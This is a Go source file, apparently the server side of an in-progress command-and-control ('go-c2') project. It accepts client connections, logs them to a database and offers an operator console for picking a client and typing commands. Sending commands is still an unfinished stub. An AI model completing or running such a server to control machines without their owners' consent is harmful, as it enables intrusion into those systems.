package main

import (
    "encoding/gob"
    "fmt"
    "net"
    "bufio"
    "strings"
    "go-c2/server/utils"
    "log"
    "os"
)

const help = `help -> shows help
showClients -> shows connected available clients
exit -> exits the server
`

// Function that handles the registration phase
func handleRegister(conn net.Conn, server *utils.Server, logger *utils.Logger) {
    dec := gob.NewDecoder(conn)
    client := &utils.Client{}
    dec.Decode(client)

    err := utils.InsertNewClientQuery(*client)
    if err != nil {
        log.Fatal(err)
    }

    logger.InfoLogger.Println("Client "+client.Uid+" added to database")

    // Sends confirmation mesage to client so he knows that he was accepted
    server.SendConfirmationMessageToClient(client, logger)
}


// Function to use a client to send commands
func useClient(input string, logger *utils.Logger) {
    //TODO: send command to client
    // use <client id>
    // if back exit this, otherwise its an infinite loop here
  for {
        if len(strings.Split(input, " ")) == 1 {
            fmt.Println("Please provide the client id to execute commands")
            break
        }
        reader := bufio.NewReader(os.Stdin)
        fmt.Printf("\ncommand in client > ")
        commandToClient, err := reader.ReadString('\n')
        commandToClient = strings.TrimSpace(commandToClient)

        if err != nil {
            logger.ErrorLogger.Println("Error while reading the user input")
            break
        } else {
            // TODO: verify if the client exists in db and send the command and wait for the response
            if commandToClient == "back" {
                break
            } else {
                fmt.Println("Sent " + commandToClient + " to client")
            }
        }
    }
}

// Function that waits for stdin commands
func respondsToStdin(server *utils.Server, logger *utils.Logger) {
    for {
        reader := bufio.NewReader(os.Stdin)
        fmt.Print("\ncommand > ")
        input, err := reader.ReadString('\n')
        input = strings.TrimSpace(input)

        if err != nil{
            logger.ErrorLogger.Println("Error while reading the user input")
        } else {
            // Working on this
            switch {

            case strings.Contains(input,"help"):
                fmt.Printf(help)

            case strings.Contains(input, "showClients"):
                if err := utils.SelectAllClientsQuery(); err != nil {
                    fmt.Println("Failed while trying to showClients %w\n", err)
                    logger.ErrorLogger.Printf("Failed while trying to showClients %s\n", err)
                }

            case strings.HasPrefix(input, "use"):
                useClient(input, logger)

            case strings.Contains(input, "exit"):
                fmt.Println("Going to exit...")
                return
            }
        }

    }

}


// Starts server
func startServer(server *utils.Server, logger *utils.Logger) {
    server.AssignData()
    var err error

    server.ServerSocket, err = net.Listen(server.Type, server.Host+":"+server.Port)
    if err != nil {
        logger.ErrorLogger.Println("Error listening:", err.Error())
    }

    defer server.ServerSocket.Close()

    logger.InfoLogger.Println("Listening on "+ server.Host + ":" + server.Port)

    // Waits for new Client connections
    for {

        connection, err := server.ServerSocket.Accept()
        if err != nil {
            logger.ErrorLogger.Println("Error accepting: ", err.Error())
        }

        go handleRegister(connection, server, logger)
    }

}

// Function that handles the errors
func run() error {
    logFile, err := os.OpenFile("/home/brun0/Desktop/go-c2/log/file.log", os.O_APPEND | os.O_CREATE | os.O_WRONLY, 0666)
    if err != nil {
        log.Fatalf("Error while seting up the log file %s", err)
    }

    defer logFile.Close()

    logger := &utils.Logger{}
    logger.Start(logFile)

    server := &utils.Server{}

    go startServer(server, logger) // starts listening for clients
    respondsToStdin(server, logger) // responds to stdin commands

    return nil
}

func main() {
    if err := run(); err != nil {
        fmt.Fprint(os.Stderr, err)
        os.Exit(1)
    }
}